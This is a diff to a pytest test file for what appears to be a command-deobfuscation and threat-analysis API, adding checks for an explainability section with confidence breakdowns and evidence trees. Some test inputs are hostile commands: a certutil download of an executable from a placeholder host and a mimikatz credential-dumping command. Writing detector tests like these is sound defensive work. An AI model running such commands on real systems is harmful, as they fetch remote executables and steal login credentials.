@@ -97,7 +97,7 @@ def test_response_contains_all_required_keys(client, auth):
               "evidence_refs", "confidence_summary", "reconstructed_commands",
               "decode_chain", "warnings", "unresolved_nodes",
               "mitre", "mitre_navigator", "mitre_stix", "lolbins_v2",
-              "verdict_v2",
+              "verdict_v2", "explain",
               "processing_time_ms"):
         assert k in j, f"missing {k}"
 
@@ -145,13 +145,12 @@ def test_input_echoed_back(client, auth):
     assert r.json()["input"] == "SET X=1"
 
 
-def test_decode_chain_lists_seven_steps(client, auth):
+def test_decode_chain_lists_eight_steps(client, auth):
     r = _post_parse(client, auth, input="echo hi")
     chain = r.json()["decode_chain"]
-    assert len(chain) == 7
-    assert chain[-1] == "verdict_v2"
-    assert chain[-2] == "lolbin_v2"
-    assert chain[-3] == "mitre_v2"
+    assert len(chain) == 8
+    assert chain[-1] == "explainability"
+    assert chain[-2] == "verdict_v2"
 
 
 def test_warnings_field_is_list(client, auth):
@@ -529,3 +528,55 @@ def test_verdict_v2_malicious_or_critical_for_mimikatz(client, auth):
 def test_verdict_v2_plugin_version_advertised(client, auth):
     r = _post_parse(client, auth, input="echo hi")
     assert "verdict_v2" in r.json()["plugin_versions"]
+
+
+# ── Phase 8 · Explainability API surface ──────────────────────────
+def test_explain_field_present_with_five_stage_confidence(client, auth):
+    r = _post_parse(client, auth, input="echo hi")
+    ex = r.json()["explain"]
+    conf = ex["confidence_breakdown"]
+    assert set(conf.keys()) >= {"decode", "semantic_reconstruction",
+                                "behavior", "mitre", "verdict",
+                                "weighted_overall", "weights"}
+
+
+def test_explain_evidence_tree_is_list(client, auth):
+    r = _post_parse(client, auth, input="certutil -urlcache -f http://x/a a.exe",
+                    language="cmd")
+    assert isinstance(r.json()["explain"]["evidence_tree"], list)
+
+
+def test_explain_why_not_malicious_applicable_for_benign(client, auth):
+    r = _post_parse(client, auth, input="echo hi")
+    wnm = r.json()["explain"]["why_not_malicious"]
+    assert wnm["applicable"] is True
+    assert wnm["missing_signals"]
+
+
+def test_explain_why_not_malicious_inapplicable_for_malicious(client, auth):
+    r = _post_parse(client, auth,
+                    input="mimikatz.exe sekurlsa::logonpasswords exit",
+                    language="cmd")
+    wnm = r.json()["explain"]["why_not_malicious"]
+    assert wnm["applicable"] is False
+
+
+def test_explain_narrative_locked_empty_deterministic(client, auth):
+    r = _post_parse(client, auth, input="echo hi")
+    ex = r.json()["explain"]
+    assert ex["narrative"] == ""
+    assert ex["narrative_origin"] == "advisor"
+
+
+def test_x_decode_ms_response_header_present(client, auth):
+    r = _post_parse(client, auth, input="echo hi")
+    assert "x-decode-ms" in {k.lower() for k in r.headers.keys()}
+    # Header must parse to a float.
+    val = r.headers.get("x-decode-ms") or r.headers.get("X-Decode-Ms")
+    assert val
+    float(val)  # raises if malformed
+
+
+def test_explainability_plugin_version_advertised(client, auth):
+    r = _post_parse(client, auth, input="echo hi")
+    assert "explainability" in r.json()["plugin_versions"]
